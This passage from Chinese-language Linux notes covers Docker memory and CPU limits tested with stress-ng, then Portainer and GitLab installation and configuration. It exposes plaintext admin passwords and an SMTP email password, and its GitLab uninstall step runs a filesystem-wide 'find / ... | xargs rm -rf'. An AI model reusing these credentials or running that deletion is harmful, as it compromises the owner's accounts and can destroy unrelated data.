Example: stress-ng --cpu 8 --io 4 --vm 2 --vm-bytes 128M --fork 4 --timeout 10s

Note: Sizes can be suffixed with B,K,M,G and times with s,m,h,d,y
```

假如一个容器未做内存使用限制，则该容器可以利用到系统内存最大空间，默认创建的容器没有做内存资源限制。

**范例: 默认一个workers分配256M内存，2个即占512M内存**

```
[root@ubuntu1804 ~]#docker run --name c1 -it --rm lorel/docker-stress-ng --vm 2 
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 2 vm


#因上一个命令是前台执行，下面在另一个终端窗口中执行，可以看到占用512M左右内存
[root@ubuntu1804 ~]#docker stats 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
MEM %               NET I/O             BLOCK I/O           PIDS
fd184869ff7e       c1                  91.00%              524.3MiB / 962MiB   
54.50%             766B / 0B           860kB / 0B          5
```

**范例: 指定内存最大值**

```
[root@ubuntu1804 ~]#docker run --name c1 -it --rm -m 300m lorel/docker-stress-ng --vm 2 
WARNING: Your kernel does not support swap limit capabilities or the cgroup is 
not mounted. Memory limited without swap.
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 2 vm


[root@ubuntu1804 ~]#vim /etc/default/grub
GRUB_CMDLINE_LINUX="cgroup_enable=memory swapaccount=1 net.ifnames=0"
[root@ubuntu1804 ~]#update-grub
Generating grub configuration file ...
Found linux image: /boot/vmlinuz-4.15.0-29-generic
Found initrd image: /boot/initrd.img-4.15.0-29-generic
done
[root@ubuntu1804 ~]#reboot
[root@ubuntu1804 ~]#docker run --name c1 -it --rm -m 300m lorel/docker-stress-ng 
--vm 2 
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 2 vm


#在另一个终端窗口执行
[root@ubuntu1804 ~]#docker stats --no-stream
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
MEM %               NET I/O             BLOCK I/O           PIDS
6a93f6b22034       c1                  27.06%              297.2MiB / 300MiB   
99.07%              1.45kB / 0B         4.98GB / 5.44GB     5
```

**范例: 容器占用内存造成OOM**

```
[root@ubuntu1804 ~]#docker run -it --rm lorel/docker-stress-ng --vm 6 
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 6 vm



#另一个终端窗中同时执行下面命令
[root@ubuntu1804 ~]#docker run -it --rm lorel/docker-stress-ng --vm 6
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 6 vm
[root@ubuntu1804 ~]#docker stats 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
MEM %               NET I/O             BLOCK I/O           PIDS
f33cebf5b55d       c2                  --                  -- / --             
--                  --                  --                  --
b14b597c5a4f       cool_banach         --                  -- / --             
--                  --                  --                  --


#观察日志出现OOM现象
[root@ubuntu1804 ~]#tail /var/log/syslog 
Feb  4 22:59:40 ubuntu1804 kernel: [  785.928835] [ 2575]     0  2575    67104   
39218   544768    22906          1000 stress-ng-vm
Feb  4 22:59:40 ubuntu1804 kernel: [  785.928836] [ 2594]     0  2594    67104   
37503   409600     7725          1000 stress-ng-vm
Feb  4 22:59:40 ubuntu1804 kernel: [  785.928837] [ 2601]     0  2601    67104   
38815   438272     9779          1000 stress-ng-vm
Feb  4 22:59:40 ubuntu1804 kernel: [  785.928838] [ 2602]     0  2602     1568   
   861    49152        0          1000 stress-ng-vm
Feb  4 22:59:40 ubuntu1804 kernel: [  785.928839] [ 2610]     0  2610     1568   
   861    49152        0          1000 stress-ng-vm
Feb  4 22:59:40 ubuntu1804 kernel: [  785.928840] [ 2614]     0  2614     1157   
   174    53248        0             0 update-motd-hwe
Feb  4 22:59:40 ubuntu1804 kernel: [  785.928841] [ 2615]     0  2615     3100   
    15    61440        0             0 apt-config
Feb  4 22:59:40 ubuntu1804 kernel: [  785.928842] Out of memory: Kill process 
2570 (stress-ng-vm) score 1090 or sacrifice child
Feb  4 22:59:40 ubuntu1804 kernel: [  785.929493] Killed process 2570 (stressng-vm) total-vm:268416kB, anon-rss:170352kB, file-rss:632kB, shmem-rss:28kB
Feb  4 22:59:40 ubuntu1804 kernel: [  786.018319] oom_reaper: reaped process 
2570 (stress-ng-vm), now anon-rss:0kB, file-rss:0kB, shmem-rss:28kB
```

**范例: 查看内存限制**

```
#启动两个工作进程，每个工作进程最大允许使用内存256M，且宿主机不限制当前容器最大内存
[root@ubuntu1804 ~]#docker run -it --rm lorel/docker-stress-ng --vm 2
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 2 vm

[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE                   COMMAND                 CREATED   
          STATUS             PORTS               NAMES
13e46172e1ae       lorel/docker-stress-ng   "/usr/bin/stress-ng …"   24 seconds 
ago     Up 22 seconds                           gallant_moore


[root@ubuntu1804 ~]#ls /sys/fs/cgroup/memory/docker/
13e46172e1ae8593569f05a3bebc7b41b7839da44369d43b29102661364ac2cd 
memory.kmem.tcp.limit_in_bytes     memory.numa_stat
cgroup.clone_children                                             
memory.kmem.tcp.max_usage_in_bytes memory.oom_control
cgroup.event_control                                             
memory.kmem.tcp.usage_in_bytes     memory.pressure_level
cgroup.procs                                                     
memory.kmem.usage_in_bytes         memory.soft_limit_in_bytes
memory.failcnt                                                   
memory.limit_in_bytes               memory.stat
memory.force_empty                                               
memory.max_usage_in_bytes           memory.swappiness
memory.kmem.failcnt                                               
memory.memsw.failcnt               memory.usage_in_bytes
memory.kmem.limit_in_bytes                                       
memory.memsw.limit_in_bytes         memory.use_hierarchy
memory.kmem.max_usage_in_bytes                                   
memory.memsw.max_usage_in_bytes     notify_on_release
memory.kmem.slabinfo                                             
memory.memsw.usage_in_bytes         tasks
memory.kmem.tcp.failcnt                                           
memory.move_charge_at_immigrate     


[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/memory/docker/13e46172e1ae8593569f05a3bebc7b41b7839da44369d43b291
02661364ac2cd/memory.limit_in_bytes
9223372036854771712
[root@ubuntu1804 ~]#echo 2^63|bc
9223372036854775808
```

**范例: 内存限制200m**

```
#宿主机限制容器最大内存使用:   
[root@ubuntu1804 ~]#docker run -it --rm -m 200M lorel/docker-stress-ng --vm 2 
--vm-bytes 256M 
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 2 vm
[root@ubuntu1804 ~]#docker stats --no-stream 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
MEM %               NET I/O             BLOCK I/O           PIDS
f69729b2acc1       sleepy_haibt        85.71%             198MiB / 200MiB     
98.98%              1.05kB / 0B         697MB / 60.4GB      5



#查看宿主机基于cgroup对容器进行内存资源的大小限制
[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/memory/docker/f69729b2acc16e032658a4efdab64d21ff97dcb6746d1cef451
ed82d5c98a81f/memory.limit_in_bytes
209715200
[root@ubuntu1804 ~]#echo 209715200/1024/1024|bc
200


#动态修改内存限制
[root@ubuntu1804 ~]#echo 300*1024*1024|bc
314572800
[root@ubuntu1804 ~]#echo 314572800 > 
/sys/fs/cgroup/memory/docker/f69729b2acc16e032658a4efdab64d21ff97dcb6746d1cef451
ed82d5c98a81f/memory.limit_in_bytes
[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/memory/docker/f69729b2acc16e032658a4efdab64d21ff97dcb6746d1cef451
ed82d5c98a81f/memory.limit_in_bytes
314572800
[root@ubuntu1804 ~]#docker stats --no-stream 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
MEM %               NET I/O             BLOCK I/O           PIDS
f69729b2acc1       sleepy_haibt        76.69%              297.9MiB / 300MiB   
99.31%              1.05kB / 0B         1.11GB / 89.1GB     5 



#通过echo 命令可以改内存限制的值，但是可以在原基础之上增大内存限制，缩小内存限制会报错write 
error: Device or resource busy 
[root@ubuntu1804 ~]#echo 209715200 > 
/sys/fs/cgroup/memory/docker/f69729b2acc16e032658a4efdab64d21ff97dcb6746d1cef451
ed82d5c98a81f/memory.limit_in_bytes
-bash: echo: write error: Device or resource busy
[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/memory/docker/f69729b2acc16e032658a4efdab64d21ff97dcb6746d1cef451
ed82d5c98a81f/memory.limit_in_bytes
314572800
```

**范例: 内存大小软限制**

```
[root@ubuntu1804 ~]#docker run -it --rm -m 256m --memory-reservation 128m --
name magedu-c1 lorel/docker-stress-ng --vm 2 --vm-bytes 256M 
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 2 vm


[root@ubuntu1804 ~]#docker stats --no-stream 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
MEM %               NET I/O             BLOCK I/O           PIDS
aeb38acde581       magedu-c1           72.45%              253.9MiB / 256MiB   
99.20%             976B / 0B           9.47GB / 39.4GB     5 


#查看硬限制
[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/memory/docker/aeb38acde58155d421f998a54e9a99ab60635fe00c9070da050
cc49a2f62d274/memory.limit_in_bytes 268435456



#查看软限制
[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/memory/docker/aeb38acde58155d421f998a54e9a99ab60635fe00c9070da050
cc49a2f62d274/memory.soft_limit_in_bytes 134217728




#软限制不能高于硬限制
[root@ubuntu1804 ~]#docker run -it --rm -m 256m --memory-reservation 257m --name magedu-c1 lorel/docker-stress-ng --vm 2 --vm-bytes 256M 
docker: Error response from daemon: Minimum memory limit can not be less than 
memory reservation limit, see usage.
See 'docker run --help'.
```

**范例: 关闭OOM机制**

```
#查看docker OOM机制默认值
[root@ubuntu1804 ~]#cat /sys/fs/cgroup/memory/docker/memory.oom_control 
oom_kill_disable 0
under_oom 0
oom_kill 0 


#启动容器时关闭OOM机制
[root@ubuntu1804 ~]#docker run -it --rm -m 200m --oom-kill-disable lorel/docker-stress-ng --vm 2 --vm-bytes 256M 
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 2 vm
[root@ubuntu1804 ~]#docker stats --no-stream 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
MEM %               NET I/O             BLOCK I/O           PIDS
b655d88228c0       silly_borg          0.00%               197.2MiB / 200MiB   
98.58%              1.31kB / 0B         1.84MB / 484MB      5


[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/memory/docker/b655d88228c04d7db6a6ad833ed3d05d4cd596ef09834382e17942db0295dc0c/memory.oom_control 
oom_kill_disable 1
under_oom 1
oom_kill 0
```

#### 48.11.3 容器的CPU限制

##### 48.11.3.1 CFS原理

```
cfs定义了进程调度的新模型，它给cfs_rq（cfs的run queue）中的每一个进程安排一个虚拟时钟vruntime。如果一个进程得以执行，随着时间的增长，其vruntime将不断增大。没有得到执行的进程vruntime不变, 而调度器总是选择vruntime跑得最慢的那个进程来执行。这就是所谓的“完全公平”。为了区别不同优先级的进程，优先级高的进程vruntime增长得慢，以至于它可能得到更多的运行机会。CFS的意义在于， 在一个混杂着大量计算型进程和IO交互进程的系统中，CFS调度器相对其它调度器在对待IO交互进程要更加友善和公平。
```

##### 48.11.3.2 配置默认的CFS调度程序

```
默认情况下，每个容器对主机的CPU周期的访问都是不受限制的。可以设置各种约束，以限制给定容器对主机CPU周期的访问。大多数用户使用并配置 默认的CFS调度程序。在Docker 1.13及更高版本中，还可以配置 realtime scheduler。

CFS是用于常规Linux进程的Linux内核CPU调度程序。通过几个运行时标志,可以配置对容器拥有的CPU资源的访问量。使用这些设置时，Docker会在主机上修改容器cgroup的设置。
```

![1660552065457](linux体系.assets/1660552065457.png)

##### 48.11.3.3 使用stress-ng测试cpu配置

**范例: 查看 stress-n 关于cpu的帮助**

```
[root@ubuntu1804 ~]#docker run -it --rm --name magedu-c1 lorel/docker-stress-ng |grep cpu
-c N, --cpu N            start N workers spinning on sqrt(rand())
       --cpu-ops N        stop when N cpu bogo operations completed
-l P, --cpu-load P       load CPU by P %%, 0=sleep, 100=full load (see -c)
       --cpu-method m     specify stress cpu method m, default is all
       
       
Example: stress-ng --cpu 8 --io 4 --vm 2 --vm-bytes 128M --fork 4 --timeout 10s
```

**范例: 不限制容器CPU**

```
[root@ubuntu1804 ~]#lscpu |grep CPU
CPU op-mode(s):      32-bit, 64-bit
CPU(s):              6
On-line CPU(s) list: 0-5
CPU family:          6
Model name:         Intel(R) Core(TM) i7-4710HQ CPU @ 2.50GHz
CPU MHz:             2494.236
NUMA node0 CPU(s):   0-5



#占用4个CPU资源.但只是平均的使用CPU资源
[root@ubuntu1804 ~]#docker run -it --rm   lorel/docker-stress-ng --cpu 4 
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 4 cpu, 4 vm
[root@ubuntu1804 ~]#docker stats --no-stream 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
  MEM %               NET I/O             BLOCK I/O           PIDS
818a85e1da2f       frosty_taussig      595.57%             1.037GiB / 2.908GiB 
  35.64%              1.12kB / 0B         0B / 0B             13
[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/cpuset/docker/818a85e1da2f9a4ef297178a9dc09b338b2308108195ad8d419
7a1c47febcbff/cpuset.cpus0-5
[root@ubuntu1804 ~]#top
```

![1660552192347](linux体系.assets/1660552192347.png)

**范例: 限制使用CPU**

```
#开4个cpu但限制你用1.5
[root@ubuntu1804 ~]#docker run -it --rm --cpus 1.5 lorel/docker-stress-ng --cpu 4 
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 4 cpu, 4 vm



[root@ubuntu1804 ~]#docker stats --no-stream 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
  MEM %               NET I/O             BLOCK I/O           PIDS
9f8b2e693113       busy_hodgkin        147.71%             786.8MiB / 2.908GiB 
  26.42%             836B / 0B           0B / 0B             13
```

**范例: 绑定CPU**

```
#一般不建议绑在0号CPU上，因0号CPU一般会较忙
[root@ubuntu1804 ~]#docker run -it --rm --cpus 1.5 --cpuset-cpus 2,4-5 
lorel/docker-stress-ng --cpu 4 
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 4 cpu, 4 vm



[root@ubuntu1804 ~]#docker stats --no-stream 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
  MEM %               NET I/O             BLOCK I/O           PIDS
585879094e73       hungry_albattani    154.35%             1.099GiB / 2.908GiB 
  37.79%             906B / 0B           0B / 0B             13
[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/cpuset/docker/585879094e7382d2ef700947b4454426eee7f943f8d1438fe42
ce34df789227b/cpuset.cpus 
2,4-5
```

**范例: 多个容器的CPU利用率比例**

```
#同时开两个容器
[root@ubuntu1804 ~]#docker run -it --rm --name c1 --cpu-shares 1000 lorel/docker-stress-ng --cpu 4 
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 4 cpu, 4 vm



[root@ubuntu1804 ~]#docker run -it --rm --name c2 --cpu-shares 500 lorel/docker-stress-ng --cpu 4 
stress-ng: info: [1] defaulting to a 86400 second run per stressor
stress-ng: info: [1] dispatching hogs: 4 cpu, 4 vm


[root@ubuntu1804 ~]#docker stats --no-stream 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
  MEM %               NET I/O             BLOCK I/O           PIDS
a1d4c6e6802d       c2                  195.88%             925.3MiB / 2.908GiB 
  31.07%             726B / 0B           0B / 0B             13
d5944104aff4       c1                  398.20%             1.036GiB / 2.908GiB 
  35.64%             906B / 0B           0B / 0B             13
  
  
  
[root@ubuntu1804 ~]# #查看c1容器的cpu利用比例
[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/cpu,cpuacct/docker/d5944104aff40b7b76f536c45a68cd4b98ce466a73416b
68819b9643e3f49da7/cpu.shares 
1000



#查看c2容器的cpu利用比例
[root@ubuntu1804 ~]#cat 
/sys/fs/cgroup/cpu,cpuacct/docker/a1d4c6e6802d1b846b33075f3c1e1696376009e85d9ff8
756f9a8d93d3da3ca6/cpu.shares 
500




#再打开新的容器，cpu分配比例会动态调整
[root@ubuntu1804 ~]#docker run -it --rm --name c3 --cpu-shares 2000 
lorel/docker-stress-ng --cpu 4 
[root@ubuntu1804 ~]#docker stats --no-stream 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
  MEM %               NET I/O             BLOCK I/O           PIDS
c2d54818e1fe       c3                  360.15%             664.5MiB / 2.908GiB 
  22.31%             726B / 0B           1.64GB / 150MB      13
a1d4c6e6802d       c2                  82.94%              845.2MiB / 2.908GiB 
  28.38%             936B / 0B           103MB / 4.54MB      13
d5944104aff4       c1                  181.18%             930.1MiB / 2.908GiB 
  31.23%              1.12kB / 0B         303MB / 19.8MB      13
```

**范例: 动态调整cpu shares值**

```
[root@ubuntu1804 ~]#echo 2000 > 
/sys/fs/cgroup/cpu,cpuacct/docker/a1d4c6e6802d1b846b33075f3c1e1696376009e85d9ff8756f9a8d93d3da3ca6/cpu.shares


[root@ubuntu1804 ~]#docker stats --no-stream 
CONTAINER ID       NAME               CPU %               MEM USAGE / LIMIT   
  MEM %               NET I/O             BLOCK I/O           PIDS
a1d4c6e6802d       c2                  389.31%             1.037GiB / 2.908GiB 
  35.64%              1.01kB / 0B         1.16GB / 14MB       13
d5944104aff4       c1                  200.28%             1.036GiB / 2.908GiB 
  35.63%              1.19kB / 0B         2.66GB / 26.7MB     13
```

### 48.12 可视化图形工具Portainer

#### 48.12.1 Portainer介绍

![1660555235276](linux体系.assets/1660555235276.png)

```
Portainer是一个可视化的容器镜像的图形管理工具，利用Portainer可以轻松构建，管理和维护Docker环境。 而且完全免费，基于容器化的安装方式，方便高效部署。

官方站点: https://www.portainer.io/

liusenbiao.com:9000
账号：admin
密码：Liu19971009
```

#### 48.12.2 安装Portainer

```
#官方安装说明: https://www.portainer.io/installation/
[root@ubuntu1804 ~]#docker search portainer |head -n 3
NAME                 DESCRIPTION                     STARS         OFFICIAL   
AUTOMATED
portainer/portainer   Making Docker management easy. https://porta…   1569       
       
portainer/agent       An agent used to manage all the resources in…   54         
     0   
     


#portainer-ce项目代替portainer
[root@ubuntu1804 ~]#docker pull portainer/portainer-ce
[root@ubuntu1804 ~]#docker volume create portainer_data
portainer_data
[root@ubuntu1804 ~]#docker run -d -p 8000:8000 -p 9000:9000 --name=portainer --restart=always -v /var/run/docker.sock:/var/run/docker.sock -v portainer_data:/data portainer/portainer-ce
20db26b67b791648c2ef6aee444a5226a9c897ebcf0160050e722dbf4a4906e3
[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE                 COMMAND             CREATED           
  STATUS             PORTS                                           NAMES
20db26b67b79       portainer/portainer   "/portainer"        5 seconds ago     
 Up 4 seconds        0.0.0.0:8000->8000/tcp, 0.0.0.0:9000->9000/tcp   portainer
```

#### 48.12.3 登录和使用Portainer

```
用浏览器访问: http://10.0.0.87:9000 可以看到以下界面
设置admin用户密码，需要输入两次超过8个字符的相同的密码
账户：admin
密码：Liu19971009
```

![1660557600068](linux体系.assets/1660557600068.png)

![1660557713546](linux体系.assets/1660557713546.png)

#### 48.12.4 查看容器和镜像

![1660557861008](linux体系.assets/1660557861008.png)

**查看容器**

![1660557995519](linux体系.assets/1660557995519.png)

**查看镜像**

![1660558548777](linux体系.assets/1660558548777.png)

![1660559439917](linux体系.assets/1660559439917.png)

#### 48.12.5 docker命令总结

```
attach 						#当前shell下attach连接指定运行镜像
build 						#通过dockerfile定制镜像
commit 						#提交当前容器为新的镜像
cp 						    #从容器中拷贝指定文件或者目录到宿主机中
create 					    #创建一个新的容器，同run 但不启动容器
diff 					    #查看docker容器变化
events 						#从docker服务获取容器实时事件
exec 						#在已存在的容器上运行命令
export 						#导出容器的内容作为一个tar归档文件[对应import]
history 					#展示一个镜像形成历史
images 						#列出系统当前镜像
import       				 #从tar包中的内容创建一个新的文件系统映像[对应export]
info 						#显示系统相关信息
inspect 					#查看容器详细信息
kill 						#kill指定容器
load 						#从一个tar包中加载一个镜像[对应save]
login 						#注册或者登陆一个docker源服务器
logout 						#从当前docker registry退出
logs 						#输出当前容器日志信息
port 						#查看映射端口对应的容器内部源端口
pause     					 #暂停容器
ps 							#列出容器列表
pull 						#从docker镜像源服务器拉取指定镜像或者库镜像
push 						#推送指定镜像或者库镜像至docker源服务器
restart 					#重启运行的容器
rm 						    #移除一个或者多个容器
rmi 						#移除一个或多个镜像[无容器使用该镜像才可删除，否则需要删除相关容器才可继续或 -f 强制删除]
run 						#创建一个新的容器并运行一个命令
save 						#保存一个镜像为一个tar包[对应load]
search 						#在docker hub 中搜索镜像
start					    #启动容器
stop					    #停止容器
tag 					    #给源中镜像打标签
top 					    #查看容器中运行的进程信息
unpause 					#取消暂停容器
version 					#查看docker版本号
wait 						#截取容器停止时的退出状态值
```

## 49.DevOps

### 49.1 DevOps简介

```
DevOps 是Development和Operations的组合，也就是开发和运维的简写。
DevOps 是针对企业中的研发人员、运维人员和测试人员的工作理念，是他们在应用开发、代码部署和质量测试等整条生命周期中协作和沟通的最佳实践，DevOps 强调整个组织的合作以及交付和基础设施变更的自动化、从而实现持续集成、持续部署和持续交付。
DevOps 四大平台：代码托管(gitlab/svn)、项目管理(jira)、运维平台(腾讯蓝鲸/开源平台)、持续交付(Jenkins/gitlab)
```

![1661438485206](linux体系.assets/1661438485206.png)

![1661438958174](linux体系.assets/1661438958174.png)

#### 49.1.1 持续集成(CI-Continuous integration)

![1661439230961](linux体系.assets/1661439230961.png)

```
持续集成是指多名开发者在开发不同功能代码的过程当中，可以频繁的将代码行合并到一起并切相互不影响工作。
```

#### 49.1.2 持续部署(CD-continuous deployment)

```
是基于某种工具或平台实现代码自动化的构建、测试和部署到线上环境以实现交付高质量的产品,持续部署在某种程度上代表了一个开发团队的更新迭代速率。
```

**大致流程**

![1661439802671](linux体系.assets/1661439802671.png)

#### 49.1.3 持续交付(Continuous Delivery)

```
持续交付是在持续部署的基础之上，将产品交付到线上环境，因此持续交付是产品价值的一种交付，是产品价值的一种盈利的实现。
```

![1661439253623](linux体系.assets/1661439253623.png)

### 49.2 Gitlab部署与使用

**官当文档**

```
https://about.gitlab.com/install/ # Gitlab 服务的安装文档
https://docs.gitlab.com/ce/install/requirements.html #安装环境要求
```

**gitlab账号密码**

```
liusenbiao.com:1314
账号：root
密码：Liu19971009
```

![1661753938963](linux体系.assets/1661753938963.png)

#### 49.2.1 下载并部署gitlab

##### 49.2.1.1 gitlab安装及使用

**下载地址：**

```
安装包下载地址：https://packages.gitlab.com/gitlab/gitlab-ce 
centos 包国内下载地址：https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/
ubuntu 国内下载地址：https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/bionic/main/g/gitlab-ce/
推荐下载11.11.8版本的
```

**开始安装gitlab**

**ubuntu:**

```
root@ubuntu1804:~# cd /usr/local/src/
root@ubuntu1804:~# wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/bionic/main/g/gitlab-ce/gitlab-ce_11.11.8-ce.0_amd64.deb --no-check-certificate

root@ubuntu1804:/usr/local/src# dpkg -i gitlab-ce_11.11.8-ce.0_amd64.deb
```

**centos:**

```
root@ubuntu1804:~# cd /usr/local/src/
root@ubuntu1804:~# wget https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/yum/el7/gitlab-ce-11.11.8-ce.0.el7.x86_64.rpm  --no-check-certificate

[root@centos7 src]# yum -y install gitlab-ce-11.11.8-ce.0.el7.x86_64.rpm
[root@centos8 src]# rpm -ivh gitlab-ce-13.6.0-ce.0.el8.x86_64.rpm
```

![1661689842832](linux体系.assets/1661689842832.png)

##### 49.2.1.2 gitlab 配置使用

**配置external_url**

```
[root@centos7 ~]# vim /etc/gitlab/gitlab.rb
##! https://docs.gitlab.com/omnibus/settings/configuration.html#configuring-the-external-url-for-gitlab
external_url 'http://www.liusenbiao.com:1314'  #改成你本机的地址
unicorn['port'] = 8099
nginx['listen_port'] = 83
puma['port'] = 8088
```

**配置邮箱**

```
[root@centos7 ~]# vim /etc/gitlab/gitlab.rb
gitlab_rails['smtp_enable'] = true
gitlab_rails['smtp_address'] = "smtp.qq.com"
gitlab_rails['smtp_port'] = 465
gitlab_rails['smtp_user_name'] = "1805336068@qq.com"
gitlab_rails['smtp_password'] = "mkmzfnyrjkojbgfg"
gitlab_rails['smtp_domain'] = "qq.com"
gitlab_rails['smtp_authentication'] = :login
gitlab_rails['smtp_enable_starttls_auto'] = true
gitlab_rails['smtp_tls'] = true
gitlab_rails['gitlab_email_from'] = "1805336068@qq.com"
#user["git_user_email"] = "1805336068@qq.com"

[root@centos7 ~]# gitlab-ctl reconfigure
[root@centos7 ~]# gitlab-ctl restart
```

![1661741026391](linux体系.assets/1661741026391.png)

![1661741356213](linux体系.assets/1661741356213.png)

##### 49.2.1.3 卸载gitlab

```
[root@centos7 ~]# gitlab-ctl stop
[root@centos7 ~]# rpm -e gitlab-ce
[root@centos7 ~]# ps aux | grep gitlab
[root@centos7 ~]# kill -9 5954
[root@centos7 ~]# find / -name "*gitlab*" | xargs rm -rf
```

**gitlab 相关的目录**

```
/etc/gitlab #配置文件目录
/run/gitlab #运行 pid 目录
/opt/gitlab #安装目录
/var/opt/gitlab #数据目录
/var/log/gitlab #日志目录
```

##### 49.2.1.4 常用命令

**gitlab-rails**

```
# gitlab-rails用于启动控制台进行特殊操作，比如修改管理员密码、打开数据库控制台( gitlab-rails dbconsole)等
[root@tencent_server ~]# gitlab-rails dbconsole
psql (11.9)
Type "help" for help.

gitlabhq_production=> \db
         List of tablespaces
    Name    |    Owner    | Location 
------------+-------------+----------
 pg_default | gitlab-psql | 
 pg_global  | gitlab-psql | 
(2 rows)

gitlabhq_production=> 

# gitlab-rails --help
```

 **gitlab-psql**

```
#数据库命令行
root@s1:~# gitlab-psql 
psql (9.6.11)
Type "help" for help.
gitlabhq_production=# \db
 List of tablespaces
 Name | Owner | Location 
------------+-------------+----------
pg_default | gitlab-psql | 
pg_global | gitlab-psql | 
(2 rows)
```

**其他命令**

```
gitlab-rake 			#数据备份恢复等数据操作
gitlab-ctl 				#客户端命令行操作行
gitlab-ctl stop 		 #停止gitlab
gitlab-ctl start 		 #启动gitlab
gitlab-ctl restar 		 #重启gitlab
gitlab-ctl status		 #查看组件运行状态
gitlab-ctl tail nginx 	  #查看某个组件的日志
```

![1661785074128](linux体系.assets/1661785074128.png)

##### 49.2.1.5 关闭账号注册

![1661853967942](linux体系.assets/1661853967942.png)

![1661854157734](linux体系.assets/1661854157734.png)

